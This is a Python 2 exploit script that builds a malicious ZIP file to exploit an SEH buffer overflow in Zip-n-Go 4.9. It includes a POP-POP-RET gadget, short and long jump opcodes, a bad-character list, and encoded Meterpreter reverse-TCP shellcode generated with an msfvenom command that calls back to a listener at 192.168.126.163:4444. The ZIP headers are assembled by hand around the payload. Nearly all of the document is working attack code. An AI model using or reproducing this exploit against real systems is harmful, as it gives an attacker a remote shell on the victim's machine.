# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in Zip-n-Go 4.9. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

#0x00423713 : pop ebx # pop ebp # ret  | startnull,ascii {PAGE_EXECUTE_READ} [zng.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\PT LabMachine\Desktop\zng.exe)

#short jump: nasm > jmp $-20
#00000000  EBEA              jmp short 0xffffffec

# Long jump: nasm > jmp $-400
# 00000000  E96BFEFFFF        jmp 0xfffffe70

# badchars: '\x00\x0A\x0D'
# shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.163 LPORT=4444 -b '\x00\x0A\x0D' -v scode -f python
from binascii import unhexlify

filename= "test4.zip"

scode =  ""
scode += "\xd9\xc9\xbb\xaa\x17\x05\xab\xd9\x74\x24\xf4\x5a\x29"
scode += "\xc9\xb1\x56\x83\xea\xfc\x31\x5a\x14\x03\x5a\xbe\xf5"
scode += "\xf0\x57\x56\x7b\xfa\xa7\xa6\x1c\x72\x42\x97\x1c\xe0"
scode += "\x06\x87\xac\x62\x4a\x2b\x46\x26\x7f\xb8\x2a\xef\x70"
scode += "\x09\x80\xc9\xbf\x8a\xb9\x2a\xa1\x08\xc0\x7e\x01\x31"
scode += "\x0b\x73\x40\x76\x76\x7e\x10\x2f\xfc\x2d\x85\x44\x48"
scode += "\xee\x2e\x16\x5c\x76\xd2\xee\x5f\x57\x45\x65\x06\x77"
scode += "\x67\xaa\x32\x3e\x7f\xaf\x7f\x88\xf4\x1b\x0b\x0b\xdd"
scode += "\x52\xf4\xa0\x20\x5b\x07\xb8\x65\x5b\xf8\xcf\x9f\x98"
scode += "\x85\xd7\x5b\xe3\x51\x5d\x78\x43\x11\xc5\xa4\x72\xf6"
scode += "\x90\x2f\x78\xb3\xd7\x68\x9c\x42\x3b\x03\x98\xcf\xba"
scode += "\xc4\x29\x8b\x98\xc0\x72\x4f\x80\x51\xde\x3e\xbd\x82"
scode += "\x81\x9f\x1b\xc8\x2f\xcb\x11\x93\x27\x38\x18\x2c\xb7"
scode += "\x56\x2b\x5f\x85\xf9\x87\xf7\xa5\x72\x0e\x0f\xbc\x95"
scode += "\xb1\xdf\x06\xf5\x4f\xe0\x76\xdf\x8b\xb4\x26\x77\x3d"
scode += "\xb5\xad\x87\xc2\x60\x5b\x82\x54\x4b\x33\xec\x07\x23"
scode += "\x41\x11\x59\xe8\xcc\xf7\x09\x40\x9e\xa7\xe9\x30\x5e"
scode += "\x18\x82\x5a\x51\x47\xb2\x64\xb8\xe0\x59\x8b\x14\x58"
scode += "\xf6\x32\x3d\x12\x67\xba\xe8\x5e\xa7\x30\x18\x9e\x66"
scode += "\xb1\x69\x8c\x9f\xa6\x91\x4c\x60\x43\x91\x26\x64\xc5"
scode += "\xc6\xde\x66\x30\x20\x41\x98\x17\x33\x86\x66\xe6\x05"
scode += "\xfc\x51\x7c\x29\x6a\x9e\x90\xa9\x6a\xc8\xfa\xa9\x02"
scode += "\xac\x5e\xfa\x37\xb3\x4a\x6f\xe4\x26\x75\xd9\x58\xe0"
scode += "\x1d\xe7\x87\xc6\x81\x18\xe2\x54\xc5\xe6\x70\x73\x6e"
scode += "\x8e\x8a\xc3\x8e\x4e\xe1\xc3\xde\x26\xfe\xec\xd1\x86"
scode += "\xff\x26\xba\x8e\x8a\xa6\x08\x2f\x8a\xe2\xcd\xf1\x8b"
scode += "\x01\xd6\x02\xf1\x6a\xe9\xe3\x06\x63\x8e\xe4\x06\x8b"
scode += "\xb0\xd9\xd0\xb2\xc6\x1c\xe1\x80\xd9\x2b\x44\xa0\x73"
scode += "\x53\xda\xb2\x51"

payload =  "A" * 3505 + scode + "\x90" * 30 + "\xE9\x6B\xFE\xFF\xFF" + "\xEB\xEA\x42\x42" + "\x13\x37\x42\x00" + "D" * 152

payloadLength = len(payload)

payloadLengthhex = format(payloadLength,'#06x')

payloadLengthByte1 = unhexlify(payloadLengthhex[2:4])
payloadLengthByte2 = unhexlify(payloadLengthhex[4:6])

sizeCD = format(46+payloadLength,'#06x')

sizeCDByte1 = unhexlify(sizeCD[2:4]) 
sizeCDByte2 = unhexlify(sizeCD[4:6])

offsetCD = format(30+payloadLength,'#06x')

offsetCDByte1 = unhexlify(offsetCD[2:4])
offsetCDByte2 = unhexlify(offsetCD[4:6])

ldf_header = "\x50\x4B\x03\x04\x14\x00\x00"
ldf_header +="\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
ldf_header +="\x00\x00\x00\x00\x00\x00\x00\x00\x00"
ldf_header += payloadLengthByte2 + payloadLengthByte1 # file size
ldf_header +="\x00\x00"

cdf_header = "\x50\x4B\x01\x02\x14\x00\x14"
cdf_header +="\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" 
cdf_header +="\x00\x00\x00\x00\x00\x00\x00\x00\x00"
cdf_header += payloadLengthByte2 + payloadLengthByte1 # file size
cdf_header +="\x00\x00\x00\x00\x00\x00\x00\x00"
cdf_header += "\x20\x00\x00\x00\x00\x00\x00\x00"

eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
eofcdf_header += sizeCDByte2 + sizeCDByte1 + "\x00\x00" # Size of central directory (bytes)
eofcdf_header += offsetCDByte2 +  offsetCDByte1 + "\x00\x00" # Offset of start of central directory,
                    # relative to start of archive
eofcdf_header +="\x00\x00"


print "Creating " + filename + " file \n";

textfile = open(filename,'w')
textfile.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
textfile.close()
